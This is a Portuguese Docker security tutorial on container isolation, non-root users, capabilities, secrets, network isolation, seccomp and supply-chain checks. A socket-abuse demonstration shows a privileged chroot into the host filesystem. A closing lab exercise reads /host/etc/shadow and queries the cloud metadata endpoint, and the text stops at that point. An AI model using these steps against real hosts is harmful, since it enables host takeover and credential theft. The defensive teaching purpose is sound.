Fundamentos

Por que Segurança em Docker Importa

Containers Docker compartilham o kernel do host — eles NÃO são máquinas virtuais e NÃO fornecem isolamento total. Entender isso é o primeiro passo para construir ambientes seguros.

Containers NÃO São VMs — A Diferença Fundamental

Muitas pessoas tratam containers como se fossem VMs leves e seguras. Essa suposição pode ser perigosa:

VM vs Container — Modelo de isolamentoConceito
# ════════════════════════════════════════════════════════════════
# MÁQUINA VIRTUAL (VM)
# ════════════════════════════════════════════════════════════════
#
# ┌─────────────────┐  ┌─────────────────┐
# │   App A         │  │   App B         │
# │   Libs          │  │   Libs          │
# │   Kernel Linux  │  │   Kernel Linux  │  ← Kernel PRÓPRIO
# │   (completo)    │  │   (completo)    │
# └────────┬────────┘  └────────┬────────┘
#          │                     │
# ┌────────┴─────────────────────┴────────┐
# │         Hypervisor (VMware, KVM)       │
# ├────────────────────────────────────────┤
# │         Hardware / Host OS             │
# └────────────────────────────────────────┘
#
# ✅ Isolamento FORTE: kernels separados
# ✅ Exploits no kernel do guest não afetam host
# ✅ Modelo de segurança testado há décadas
#
# ════════════════════════════════════════════════════════════════
# CONTAINER DOCKER
# ════════════════════════════════════════════════════════════════
#
# ┌─────────────────┐  ┌─────────────────┐
# │   App A         │  │   App B         │
# │   Libs          │  │   Libs          │
# └────────┬────────┘  └────────┬────────┘
#          │                     │
# ┌────────┴─────────────────────┴────────┐
# │         Kernel Linux (COMPARTILHADO)   │  ← MESMO kernel!
# ├────────────────────────────────────────┤
# │         Hardware / Host OS             │
# └────────────────────────────────────────┘
#
# ⚠️ Isolamento via namespaces + cgroups (mais leve)
# ⚠️ Exploits no kernel podem escapar do container
# ⚠️ Se o container roda como root, é root NO HOST
# ⚠️ Syscalls compartilhadas = superfície de ataque maior
#
# CONCLUSÃO:
# Containers são PROCESSOS ISOLADOS, não máquinas isoladas.
# A segurança depende de COMO você configura o container.

Riscos Reais em Docker

Estes são riscos concretos que já causaram brechas em produção:

Riscos de Container EscapeRisco Alto
# CONTAINER ESCAPE — Sair do container
# ═══════════════════════════════════════
#
# COMO ACONTECE:
# 1. Container roda como root
# 2. Exploita vulnerabilidade no kernel
# 3. Acessa filesystem do host
# 4. Escala para root no host
#
# EXEMPLOS REAIS:
# • CVE-2019-5736 (runc exploit)
#   → Sobrescrevia binário do runc no host
#   → Container root → Host root
#
# • CVE-2020-15257 (containerd)
#   → Acesso ao containerd-shim API
#   → Escalação de privilégios
#
# • CVE-2022-0185 (kernel exploit)
#   → Bug em file_system_context
#   → Escape via user namespace
#
# IMPACTO:
# ❌ Acesso total ao host
# ❌ Acesso a TODOS os outros containers
# ❌ Acesso a secrets/credenciais do host
# ❌ Movimentação lateral na rede
Riscos de Imagens e Supply ChainRisco Médio
# SUPPLY CHAIN ATTACKS
# ═══════════════════════════════════════
#
# IMAGENS MALICIOSAS:
# • Docker Hub tem imagens com malware
# • Typosquatting: "ngimx" em vez de "nginx"
# • Imagens populares com backdoors
# • Camadas escondidas com cryptominers
#
# VULNERABILIDADES CONHECIDAS (CVEs):
# • Imagem base desatualizada = CVEs
# • Dependências com falhas conhecidas
# • Exemplo: log4j em imagens Java
#
# SEGREDOS VAZADOS:
# • API keys hardcoded no Dockerfile
# • .env copiado para dentro da imagem
# • Chaves SSH em camadas intermediárias
# • Tokens em variáveis de ambiente
#
# DADOS EXPOSTOS:
# • Portas expostas desnecessariamente
# • Debug habilitado em produção
# • Volumes montados com dados sensíveis
# • Docker socket exposto ao container
#
# RESULTADO:
# Rodar qualquer imagem sem verificar
# é como executar código de estranhos
# com acesso root na sua máquina.
🔑 Princípio fundamental: Segurança em Docker é sobre camadas de defesa (defense in depth). Nenhuma medida isolada é suficiente — combine non-root, scan de CVEs, read-only filesystem, capabilities mínimas e monitoramento.

O Docker Socket — O Maior Risco

Montar o Docker socket dentro de um container é equivalente a dar acesso root ao host:

Docker Socket Exposure — O perigoCrítico
# O DOCKER SOCKET (/var/run/docker.sock)
# ════════════════════════════════════════════════════════════════
#
# MUITAS ferramentas pedem para montar o socket:
docker run -v /var/run/docker.sock:/var/run/docker.sock ...

# POR QUE É PERIGOSO:
# Quem tem acesso ao socket pode:
# 1. Criar containers privilegiados
# 2. Montar o filesystem do host
# 3. Executar comandos como root no host
# 4. Acessar todos os outros containers

# DEMONSTRAÇÃO DO RISCO:
# Se um atacante compromete um container com socket montado:
docker run -it --privileged --pid=host \
  -v /:/host alpine chroot /host
# → Agora tem shell ROOT no HOST completo!

# QUANDO É NECESSÁRIO MONTAR O SOCKET:
# • CI/CD runners (Jenkins, GitLab Runner)
# • Monitoring (cAdvisor, Portainer)
# • Reverse proxies automáticos (Traefik)
#
# ALTERNATIVAS MAIS SEGURAS:
# 1. Use TCP com TLS (docker -H tcp://...)
# 2. Use socket proxy (tecnologia/socat com filtros)
# 3. Use Podman (rootless, daemonless)
# 4. Use Docker-in-Docker (dind) com cuidado
# 5. Limite acesso com --read-only no bind

# REGRA: NUNCA monte o socket sem entender o risco.
# Se precisar, use o mínimo de permissões possível.
Non-Root

Nunca Rodar como Root

Por padrão, containers Docker rodam como root (UID 0). Se um atacante escapar do container, ele será root no host. A primeira e mais importante defesa é sempre rodar como usuário non-root.

USER no Dockerfile — A Prática Essencial

A instrução USER define qual usuário executa os comandos dentro do container:

Dockerfile com USERRecomendado
# ════════════════════════════════════════
# PADRÃO NON-ROOT PARA NODE.JS
# ════════════════════════════════════════
FROM node:20-alpine

# Criar grupo e usuário dedicados
RUN addgroup -S appgroup && \
    adduser -S appuser -G appgroup

# Diretório da aplicação
WORKDIR /app

# Copiar e instalar deps como root
COPY package*.json ./
RUN npm ci --only=production

# Copiar código
COPY --chown=appuser:appgroup . .

# Mudar para non-root ANTES do CMD
USER appuser

# Porta > 1024 (non-root não pode <1024)
EXPOSE 3000

CMD ["node", "server.js"]

# ════════════════════════════════════════
# PADRÃO NON-ROOT PARA PYTHON
# ════════════════════════════════════════
FROM python:3.12-slim

RUN groupadd -r appgroup && \
    useradd -r -g appgroup -d /app \
    -s /sbin/nologin appuser

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir \
    -r requirements.txt

COPY --chown=appuser:appgroup . .

USER appuser

EXPOSE 8000

CMD ["gunicorn", "app:app"]
Verificar e forçar non-rootRuntime
# VERIFICAR QUEM ESTÁ RODANDO:
docker exec meu-container whoami
# appuser ← OK!
# root    ← PROBLEMA!

docker exec meu-container id
# uid=1000(appuser) gid=1000(appgroup)

# VER O USER DA IMAGEM:
docker inspect nginx:alpine \
  --format '{{.Config.User}}'
# (vazio = root!)

# FORÇAR NON-ROOT NO docker run:
docker run --user 1000:1000 nginx:alpine

# FORÇAR NON-ROOT NO COMPOSE:
services:
  app:
    image: minha-app
    user: "1000:1000"

# IMPEDIR ESCALAÇÃO PARA ROOT:
docker run --security-opt=no-new-privileges \
  minha-app

# NO COMPOSE:
services:
  app:
    security_opt:
      - no-new-privileges:true

# VERIFICAR SE IMAGEM PODE RODAR NON-ROOT:
# Muitas imagens oficiais JÁ suportam:
# • node → USER node (UID 1000)
# • nginx → Precisa ajustar porta
# • postgres → Roda como postgres
# • redis → Roda como redis

# DICA: Use portas > 1024 para non-root
# (portas 1-1023 requerem root ou
#  CAP_NET_BIND_SERVICE)

Rootless Mode — Docker Sem Root

Além de rodar containers como non-root, você pode rodar o próprio daemon Docker sem root:

Docker Rootless ModeAvançado
# DOCKER ROOTLESS MODE
# ════════════════════════════════════════════════════════════════
#
# O QUE É:
# O daemon dockerd roda como usuário comum (não root).
# Mesmo que um container escape, NÃO será root no host.
#
# INSTALAR:
# Pré-requisitos:
sudo apt-get install -y uidmap dbus-user-session

# Instalar rootless:
dockerd-rootless-setuptool.sh install

# CONFIGURAR:
# Adicionar ao ~/.bashrc:
export PATH=/home/$USER/bin:$PATH
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock

# VERIFICAR:
docker info | grep -i "root"
# rootless: true  ← Sucesso!

# LIMITAÇÕES DO ROOTLESS MODE:
# ⚠️ Não suporta --privileged (bom! mais seguro)
# ⚠️ Networking limitado (usa slirp4netns ou pasta)
# ⚠️ Cgroup v2 necessário para resource limits
# ⚠️ Algumas storage drivers não funcionam
# ⚠️ Portas < 1024 não disponíveis por padrão
#
# QUANDO USAR:
# ✅ Ambientes de CI/CD
# ✅ Desenvolvimento local seguro
# ✅ Hosts multi-tenant
# ✅ Quando não precisa de --privileged
#
# ALTERNATIVA: Podman (rootless por padrão, daemonless)

Linux Capabilities — Permissões Granulares

Em vez de dar ALL ou NOTHING, Linux capabilities permitem controle granular sobre o que o container pode fazer:

Capabilities — Drop e AddHardening
# LINUX CAPABILITIES
# ════════════════════════════════════════════════════════════════
#
# O QUE SÃO:
# Root tradicional = TODAS as permissões
# Capabilities = permissões divididas em ~40 categorias
#
# CAPABILITIES PADRÃO DO DOCKER:
# Container root recebe estas capabilities por padrão:
# CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FSETID, CAP_FOWNER,
# CAP_MKNOD, CAP_NET_RAW, CAP_SETGID, CAP_SETUID,
# CAP_SETFCAP, CAP_SETPCAP, CAP_NET_BIND_SERVICE,
# CAP_SYS_CHROOT, CAP_KILL, CAP_AUDIT_WRITE

# MELHORES PRÁTICAS — DROP ALL, ADD ESPECÍFICAS:
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE nginx

# NO COMPOSE:
services:
  web:
    image: nginx:alpine
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE    # Bind em portas < 1024
      - CHOWN               # Se precisar mudar ownership

# CAPABILITIES PERIGOSAS (NUNCA adicionar sem necessidade):
# ─────────────────────────────────────────────────────────
# CAP_SYS_ADMIN     → Quase equivalente a root completo
# CAP_NET_ADMIN     → Manipular rede do host
# CAP_SYS_PTRACE    → Debug de qualquer processo
# CAP_SYS_MODULE    → Carregar módulos no kernel
# CAP_DAC_READ_SEARCH → Ler qualquer arquivo

# VER CAPABILITIES DE UM CONTAINER:
docker inspect --format='{{.HostConfig.CapAdd}}' container
docker inspect --format='{{.HostConfig.CapDrop}}' container

# DENTRO DO CONTAINER:
cat /proc/1/status | grep -i cap
# CapPrm: 00000000a80425fb (bitmap de capabilities)
💡 Regra de ouro: Sempre use --cap-drop=ALL e adicione SOMENTE as capabilities específicas que seu container precisa. Se não sabe quais precisa, rode sem --cap-drop primeiro, depois remova uma por uma até encontrar o mínimo necessário.
Imagens

Imagens Seguras

A segurança começa na escolha e construção da imagem. Uma imagem com vulnerabilidades conhecidas é uma porta aberta para atacantes. Aprenda a escolher, escanear e construir imagens seguras.

Escolhendo Imagens Base Seguras

A escolha da imagem base determina a superfície de ataque do seu container:

Hierarquia de segurança das basesEscolha
# RANKING DE SEGURANÇA (mais → menos segura)
# ════════════════════════════════════════════
#
# 1. 🏆 SCRATCH (zero dependências)
FROM scratch
# • 0 pacotes, 0 CVEs possíveis
# • Apenas para binários estáticos
# • Ideal: Go, Rust compilados
# • Sem shell, sem debug
#
# 2. 🥈 DISTROLESS (Google)
FROM gcr.io/distroless/base-debian12
# • Sem shell, sem package manager
# • Apenas runtime necessário
# • ~2-20MB
# • Ideal: Java, Python, Node
#
# 3. 🥉 ALPINE (minimal Linux)
FROM alpine:3.20
# • musl libc + busybox (~5MB)
# • Package manager: apk
# • Poucos pacotes = poucos CVEs
# • Ideal: quando precisa de shell
#
# 4. SLIM (Debian minimizado)
FROM python:3.12-slim
# • Debian sem extras (~80-150MB)
# • Bom equilíbrio tamanho/compat
#
# 5. ⚠️ FULL (NÃO usar em produção)
FROM ubuntu:24.04
# • Centenas de pacotes instalados
# • Superfície de ataque enorme
# • Apenas para dev/debug
Exemplos práticos de bases segurasExemplos
# GO — SCRATCH (mais seguro possível)
# ════════════════════════════════════
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o /server

FROM scratch
COPY --from=builder /server /server
COPY --from=builder /etc/ssl/certs \
     /etc/ssl/certs
USER 65534:65534
ENTRYPOINT ["/server"]
# Resultado: ~10-15MB, 0 CVEs

# NODE.JS — DISTROLESS
# ════════════════════════════════════
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

FROM gcr.io/distroless/nodejs20-debian12
WORKDIR /app
COPY --from=builder /app .
USER nonroot:nonroot
CMD ["server.js"]
# Resultado: ~120MB, mínimo de CVEs

# PYTHON — SLIM + VENV
# ════════════════════════════════════
FROM python:3.12-slim AS builder
WORKDIR /app
RUN python -m venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"
COPY requirements.txt .
RUN pip install --no-cache-dir \
    -r requirements.txt

FROM python:3.12-slim
COPY --from=builder /opt/venv /opt/venv
ENV PATH="/opt/venv/bin:$PATH"
WORKDIR /app
COPY . .
USER nobody:nogroup
CMD ["python", "app.py"]

Scan de Vulnerabilidades (CVEs)

Escanear imagens é essencial para identificar vulnerabilidades conhecidas antes do deploy:

Trivy — Scanner open sourceFerramenta
# TRIVY — Scanner de CVEs mais popular
# ════════════════════════════════════════
#
# INSTALAR:
# macOS:
brew install trivy
# Linux:
curl -sfL https://raw.githubusercontent.com/\
aquasecurity/trivy/main/contrib/install.sh \
| sh -s -- -b /usr/local/bin

# SCAN DE IMAGEM:
trivy image nginx:alpine
# Mostra todas as CVEs encontradas

# SCAN COM SEVERIDADE MÍNIMA:
trivy image --severity HIGH,CRITICAL \
  minha-app:latest

# SCAN DO DOCKERFILE:
trivy config Dockerfile

# SCAN COM FAIL (para CI/CD):
trivy image --exit-code 1 \
  --severity CRITICAL \
  minha-app:latest
# Exit code 1 se encontrar CRITICAL
# → Falha o pipeline!

# FORMATOS DE SAÍDA:
trivy image -f json -o results.json \
  minha-app:latest
trivy image -f sarif -o results.sarif \
  minha-app:latest

# SCAN DO FILESYSTEM LOCAL:
trivy fs --security-checks vuln,config .

# IGNORAR CVEs ACEITAS:
# .trivyignore:
# CVE-2023-1234
# CVE-2023-5678

Pinning de Versão e Imagens Determinísticas

Nunca use :latest em produção — pins de versão garantem builds reproduzíveis e seguros:

Pinning de versão — Do errado ao corretoBoas Práticas
# ════════════════════════════════════════════════════════════════
# NÍVEIS DE PINNING (menos → mais seguro)
# ════════════════════════════════════════════════════════════════

# ❌ NÍVEL 0: Sem tag (é o :latest implícito)
FROM node
# Problema: Pode mudar a qualquer momento

# ⚠️ NÍVEL 1: Tag major
FROM node:20
# Problema: 20.10 → 20.11 pode quebrar algo

# ✅ NÍVEL 2: Tag minor + variant
FROM node:20.12-alpine
# Bom: previsível, mas pode ter patch updates

# ✅✅ NÍVEL 3: Digest (SHA256) — Máxima segurança
FROM node:20.12-alpine@sha256:abc123def456...
# Perfeito: EXATAMENTE esta imagem, nunca muda

# COMO ENCONTRAR O DIGEST:
docker inspect --format='{{index .RepoDigests 0}}' node:20-alpine
# node@sha256:a1b2c3d4e5...

docker pull node:20-alpine --quiet
# Mostra o digest no pull

# PINNING EM PACKAGE MANAGERS DENTRO DO DOCKERFILE:
# ════════════════════════════════════════════════════════════════

# ❌ Ruim: versão flutuante
RUN apt-get install -y curl

# ✅ Bom: versão pinada
RUN apt-get install -y curl=7.88.1-10+deb12u5

# ❌ Ruim: sem lock file
RUN pip install flask requests

# ✅ Bom: com hash verification
RUN pip install --require-hashes -r requirements.txt

# POLÍTICA RECOMENDADA:
# • Produção: SEMPRE pin com digest ou tag exata
# • Desenvolvimento: tag minor (ex: node:20-alpine)
# • CI/CD: tag exata + scan de CVE antes do deploy
Secrets

Secrets Management

Gerenciar segredos (senhas, tokens, chaves) é um dos maiores desafios em containers. Variáveis de ambiente NÃO são seguras para secrets sensíveis. Aprenda as alternativas corretas.

Por que ENV Vars NÃO São Seguras para Secrets

Muitos tutoriais ensinam a passar secrets via variáveis de ambiente. Isso tem problemas sérios:

Problemas com ENV para secretsRisco
# POR QUE VARIÁVEIS DE AMBIENTE NÃO SÃO SEGURAS:
# ════════════════════════════════════════════════════════════════

# 1. VISÍVEIS NO docker inspect:
docker inspect container_name | grep -A5 "Env"
# → Mostra TODOS os env vars, incluindo senhas!

# 2. VISÍVEIS NO /proc:
docker exec container cat /proc/1/environ
# → Qualquer processo no container pode ler

# 3. FICAM NOS LOGS:
# Se a app faz log das variáveis de ambiente,
# as senhas vão para o log!

# 4. HERDADAS POR PROCESSOS FILHOS:
# Qualquer subprocesso recebe TODAS as env vars
# → Bibliotecas maliciosas podem ler

# 5. FICAM NO HISTÓRICO:
docker run -e PASSWORD=super_secret ...
# → Visível no history do shell!

# 6. FICAM NA IMAGEM (se usar ENV no Dockerfile):
# ❌ NUNCA faça isso:
ENV DATABASE_PASSWORD=minha_senha
# → A senha fica em TODAS as camadas!
# → docker history mostra!

# QUANDO ENV É ACEITÁVEL:
# ✅ Configurações não-sensíveis (NODE_ENV, PORT)
# ✅ URLs públicas (API endpoints)
# ✅ Feature flags
#
# QUANDO NÃO USAR ENV:
# ❌ Senhas de banco
# ❌ API keys privadas
# ❌ Tokens de autenticação
# ❌ Chaves de criptografia
# ❌ Certificados TLS

Docker Secrets (Swarm e Compose)

Docker Secrets monta o segredo como arquivo em /run/secrets/ — mais seguro que env vars:

Docker Secrets no ComposeCompose
# docker-compose.yml com Secrets
# ════════════════════════════════════════
services:
  api:
    image: minha-api:latest
    secrets:
      - db_password
      - api_key
    environment:
      # Referência ao arquivo de secret:
      DB_PASSWORD_FILE: /run/secrets/db_password
      API_KEY_FILE: /run/secrets/api_key

  db:
    image: postgres:16-alpine
    secrets:
      - db_password
    environment:
      # Postgres suporta _FILE nativamente!
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password

# Definição dos secrets:
secrets:
  db_password:
    file: ./secrets/db_password.txt
  api_key:
    file: ./secrets/api_key.txt

# O ARQUIVO DE SECRET:
# ./secrets/db_password.txt contém APENAS:
# minha_senha_super_segura
# (sem newline no final!)

# DENTRO DO CONTAINER:
# /run/secrets/db_password → montado como
# arquivo read-only em tmpfs (RAM)
Ler secrets no códigoApp Code
# LENDO SECRETS NA APLICAÇÃO:
# ════════════════════════════════════════

# PYTHON:
import os

def get_secret(name):
    """Lê secret de arquivo ou env var."""
    # Tentar ler do arquivo primeiro
    file_path = f"/run/secrets/{name}"
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return f.read().strip()
    # Fallback para env var (dev)
    return os.environ.get(name.upper())

db_password = get_secret("db_password")

# NODE.JS:
const fs = require('fs');
const path = require('path');

function getSecret(name) {
  const filePath = `/run/secrets/${name}`;
  try {
    return fs.readFileSync(filePath, 'utf8')
             .trim();
  } catch {
    return process.env[name.toUpperCase()];
  }
}

const dbPassword = getSecret('db_password');

Network

Network Security

A rede é um vetor de ataque frequente. Containers não devem ter acesso à rede sem necessidade, portas não devem ser expostas desnecessariamente, e a comunicação entre services deve ser criptografada quando possível.

Princípio: Mínimo Acesso à Rede

Por padrão, todos os containers em uma rede Docker podem se comunicar entre si. Isso viola o princípio de mínimo privilégio:

Redes internas e isolamentoIsolamento
# REDE INTERNA (sem acesso à internet)
# ════════════════════════════════════════
#
# Por padrão, containers acessam internet.
# Para serviços que NÃO precisam (DB, cache):

# docker-compose.yml
services:
  db:
    image: postgres:16-alpine
    networks:
      - backend    # Somente rede interna

  redis:
    image: redis:7-alpine
    networks:
      - backend    # Somente rede interna

  api:
    image: minha-api
    networks:
      - frontend   # Acessa internet
      - backend    # Acessa DB e Redis

  nginx:
    image: nginx:alpine
    ports:
      - "443:443"  # Única porta exposta!
    networks:
      - frontend   # Somente frontend

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # ← SEM acesso à internet!

# RESULTADO:
# ✅ DB e Redis sem internet (impossível exfiltrar)
# ✅ API acessa ambas as redes
# ✅ Nginx é o único com porta exposta
# ✅ Atacante que compromete DB fica preso
Portas: bind em localhostExposição
# NÃO EXPOR PORTAS DESNECESSÁRIAS
# ════════════════════════════════════════

# ❌ ERRADO: Expõe em TODAS as interfaces
ports:
  - "5432:5432"    # Acessível de QUALQUER IP!
  - "6379:6379"    # Redis aberto para o mundo!

# ✅ CORRETO: Bind em localhost apenas
ports:
  - "127.0.0.1:5432:5432"  # Só localhost
  - "127.0.0.1:6379:6379"  # Só localhost

# ✅ MELHOR: Não expor porta nenhuma!
# Se o DB só é acessado por outros containers
# na mesma rede, NÃO precisa de ports:
services:
  db:
    image: postgres:16-alpine
    # Sem "ports:" — acesso apenas via rede interna
    networks:
      - backend

# VERIFICAR PORTAS EXPOSTAS:
docker ps --format "{{.Ports}}"
# 0.0.0.0:5432->5432/tcp  ← PERIGO!
# 127.0.0.1:5432->5432/tcp ← OK

# VERIFICAR DO HOST:
ss -tlnp | grep docker
netstat -tlnp | grep docker

# REGRA:
# Apenas o reverse proxy (nginx/traefik)
# deve ter portas expostas para 0.0.0.0
# Todo o resto: rede interna ou localhost

TLS entre Containers

Para ambientes de alta segurança, criptografe a comunicação mesmo entre containers na mesma rede:

Mutual TLS (mTLS) entre containersCriptografia
# TLS ENTRE CONTAINERS — QUANDO USAR
# ════════════════════════════════════════════════════════════════
#
# QUANDO É NECESSÁRIO:
# • Compliance (PCI-DSS, HIPAA, SOC2)
# • Multi-host (containers em hosts diferentes)
# • Zero-trust architecture
# • Dados altamente sensíveis (financeiro, saúde)
#
# QUANDO NÃO É NECESSÁRIO:
# • Single-host com redes isoladas (Docker bridge)
# • Desenvolvimento local
# • Ambientes não-produção

# OPÇÃO 1: TLS com certificados gerenciados pelo app
services:
  api:
    image: minha-api
    volumes:
      - ./certs/api:/app/certs:ro
    environment:
      TLS_CERT: /app/certs/cert.pem
      TLS_KEY: /app/certs/key.pem
      DB_SSL_CA: /app/certs/ca.pem

  db:
    image: postgres:16-alpine
    volumes:
      - ./certs/db:/var/lib/postgresql/certs:ro
    command: >
      -c ssl=on
      -c ssl_cert_file=/var/lib/postgresql/certs/server.crt
      -c ssl_key_file=/var/lib/postgresql/certs/server.key

# OPÇÃO 2: Service mesh (Linkerd, Istio)
# → Injeta sidecar proxy com mTLS automático
# → Melhor para Kubernetes, overkill para Docker standalone

# OPÇÃO 3: Docker Swarm com encrypt
docker network create --opt encrypted --driver overlay secure-net
# → Criptografa tráfego automaticamente na overlay network
💡 Regra prática: Em Docker single-host com redes internas (internal: true), TLS entre containers geralmente é overkill. O tráfego já está isolado no bridge virtual. TLS é essencial quando containers estão em hosts diferentes ou quando compliance exige.
Runtime

Runtime Security

Além de construir imagens seguras e configurar redes, é fundamental aplicar controles de segurança no momento da execução do container. Isso limita o que um atacante pode fazer mesmo que comprometa a aplicação.

Read-Only Filesystem

Containers não precisam escrever no filesystem na maioria dos casos. Um filesystem read-only impede que atacantes plantem malware:

Read-Only com tmpfs para tempHardening
# READ-ONLY FILESYSTEM
# ════════════════════════════════════════

# Docker run:
docker run --read-only \
  --tmpfs /tmp:rw,noexec,nosuid \
  --tmpfs /var/run:rw,noexec,nosuid \
  minha-app

# Docker Compose:
services:
  api:
    image: minha-api
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=64m
      - /var/run:rw,noexec,nosuid
      - /var/cache/nginx:rw,noexec,nosuid
    volumes:
      # Apenas onde PRECISA escrever:
      - app-logs:/app/logs

# POR QUE FUNCIONA:
# ✅ Atacante não pode instalar ferramentas
# ✅ Não pode modificar binários da app
# ✅ Não pode criar scripts maliciosos
# ✅ Não pode plantar backdoors
#
# TMPFS FLAGS:
# noexec → Não pode executar binários
# nosuid → Não pode setuid
# size=64m → Limita tamanho

# DICA: Teste assim:
docker exec container touch /test
# touch: cannot touch '/test': Read-only
# file system  ← Funcionou!
Seccomp — Filtro de syscallsKernel
# SECCOMP — FILTRAGEM DE SYSTEM CALLS
# ════════════════════════════════════════
#
# O QUE É:
# Seccomp filtra quais syscalls o container
# pode fazer ao kernel. Docker já aplica um
# perfil padrão que bloqueia ~44 syscalls.
#
# PERFIL PADRÃO DO DOCKER BLOQUEIA:
# • reboot, kexec_load (reiniciar host)
# • mount, umount (montar filesystems)
# • ptrace (debug de outros processos)
# • keyctl (manipular chaves do kernel)
# • bpf (Berkeley Packet Filter)
# • clock_settime (mudar hora do host)

# VERIFICAR PERFIL ATUAL:
docker inspect --format \
  '{{.HostConfig.SecurityOpt}}' container

# USAR PERFIL CUSTOMIZADO:
docker run --security-opt \
  seccomp=custom-profile.json \
  minha-app

# NO COMPOSE:
services:
  app:
    security_opt:
      - seccomp:./seccomp-profile.json

# PERFIL MAIS RESTRITIVO:
# Bloqueia TUDO e permite apenas o necessário
# (Precisa testar com a aplicação)

# ⚠️ NUNCA DESABILITAR SECCOMP:
# --security-opt seccomp=unconfined
# → Remove TODA proteção de syscalls!
# → Apenas para debug em dev!

AppArmor e no-new-privileges

Camadas adicionais de segurança no nível do kernel Linux:

AppArmor + no-new-privilegesMandatory Access
# APPARMOR — Mandatory Access Control
# ════════════════════════════════════════════════════════════════
#
# O QUE É:
# AppArmor restringe o que programas podem acessar no filesystem,
# rede e capabilities — mesmo que rodem como root dentro do container.
#
# Docker aplica perfil padrão: docker-default
# Ele restringe:
# • Acesso a /proc/sys/** (write)
# • Montagem de filesystems
# • Acesso a /sys/**
# • ptrace de outros containers

# VERIFICAR PERFIL APPARMOR:
docker inspect --format='{{.AppArmorProfile}}' container
# docker-default

# USAR PERFIL CUSTOMIZADO:
docker run --security-opt apparmor=meu-perfil minha-app

# NO COMPOSE:
services:
  app:
    security_opt:
      - apparmor:docker-custom

# ════════════════════════════════════════════════════════════════
# NO-NEW-PRIVILEGES — Impedir escalação
# ════════════════════════════════════════════════════════════════
#
# O QUE FAZ:
# Impede que processos dentro do container ganhem MORE
# privileges do que o processo pai. Bloqueia:
# • setuid binaries
# • setgid binaries
# • Escalação via capabilities

# Docker run:
docker run --security-opt=no-new-privileges:true minha-app

# Docker Compose:
services:
  app:
    security_opt:
      - no-new-privileges:true

# COMBINAÇÃO IDEAL PARA PRODUÇÃO:
services:
  api:
    image: minha-api
    read_only: true
    user: "1000:1000"
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
      - seccomp:./seccomp-custom.json
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=64m

# RESULTADO: Container extremamente restrito
# ✅ Non-root
# ✅ Sem capabilities
# ✅ Sem escalação possível
# ✅ Filesystem read-only
# ✅ Syscalls filtradas
# ✅ Temp sem execução de binários
Supply Chain

Supply Chain Security

A cadeia de suprimentos de imagens Docker é um vetor de ataque crescente. Você precisa garantir que as imagens que consome e produz são autênticas, íntegras e rastreáveis.

Docker Content Trust (DCT)

Docker Content Trust garante que imagens baixadas são assinadas pelo publisher e não foram alteradas:

Content Trust — Verificação de assinaturaIntegridade
# DOCKER CONTENT TRUST (DCT)
# ════════════════════════════════════════
#
# O QUE FAZ:
# Garante que imagens puxadas do registry
# foram assinadas pelo publisher e não
# foram modificadas em trânsito.
#
# HABILITAR:
export DOCKER_CONTENT_TRUST=1

# A PARTIR DAQUI:
# • docker pull só baixa imagens assinadas
# • docker push assina automaticamente
# • Imagens não-assinadas são REJEITADAS

# TESTE:
docker pull nginx:alpine
# → Funciona (nginx é assinada)

# DESABILITAR TEMPORARIAMENTE:

# • Root key (offline, backup seguro!)

# • Delegations (por colaborador)

Checklist

Checklist de Segurança para Produção

Antes de colocar containers em produção, valide cada item desta lista. Cada controle é uma camada adicional de defesa que reduz significativamente a superfície de ataque.

Top 10 Práticas de Segurança

1. Non-Root

Containers NUNCA rodam como root. Use USER no Dockerfile com UID > 1000. Valide com docker exec container whoami.

2. Imagem Mínima

Use Alpine, Distroless ou Scratch. Remova pacotes desnecessários. Quanto menor a imagem, menor a superfície de ataque.

3. Scan de CVEs

Execute Trivy ou Docker Scout no CI/CD. Falhe o build em CVEs CRITICAL. Monitore novas CVEs continuamente.

4. Secrets Seguros

NUNCA use ENV para senhas. Use Docker Secrets, Vault, ou o secrets manager da sua cloud. Rotacione periodicamente.

5. Read-Only FS

Use read_only: true com tmpfs apenas onde necessário. Impede instalação de malware e modificação de binários.

6. Drop ALL Caps

Use cap_drop: ALL e adicione apenas as capabilities específicas necessárias. Nunca dê SYS_ADMIN.

7. Rede Isolada

Use internal: true para serviços que não precisam de internet. Exponha apenas as portas estritamente necessárias.

8. No-New-Privileges

Sempre use no-new-privileges:true. Impede escalação via setuid/setgid binaries dentro do container.

9. Pin de Versão

Use tags exatas ou digests SHA256 para todas as imagens base. Nunca use :latest em produção.

10. Content Trust

Habilite Docker Content Trust ou use Cosign. Verifique assinaturas antes de deploy. Mantenha SBOM atualizado.

# ════════════════════════════════════════════════════════════════

# CENÁRIO: API Node.js que precisa ir para produção
# Aplicar TODAS as práticas de segurança aprendidas.

# REQUISITOS:

Exercício 3: Ataque Simulado e Defesa

Objetivo: Simular um ataque e verificar como as defesas aplicadas impedem a exploração.

Exercício 3 — Ataque e DefesaRed Team
# ════════════════════════════════════════════════════════════════
# EXERCÍCIO 3: SIMULAÇÃO DE ATAQUE E DEFESA
# ════════════════════════════════════════════════════════════════

# CENÁRIO: Você é o atacante. Tente explorar um container
# "inseguro" e depois tente o mesmo no container "hardened".

# ── PARTE A: CONTAINER INSEGURO ──────────────────────────────

# Subir container SEM proteções:
docker run -d --name inseguro \
  --privileged \
  -v /:/host \
  -p 8080:80 \
  nginx:latest

# ATAQUE 1: Verificar se é root
docker exec inseguro whoami
# root ← Sucesso do atacante!

# ATAQUE 2: Instalar ferramentas
docker exec inseguro apt-get update
docker exec inseguro apt-get install -y curl nmap
# Instalou! ← Atacante pode fazer reconhecimento

# ATAQUE 3: Acessar filesystem do host
docker exec inseguro ls /host/etc/shadow
# Consegue ler! ← Hashes de senhas do host!

# ATAQUE 4: Acessar rede
docker exec inseguro curl http://169.254.169.254/
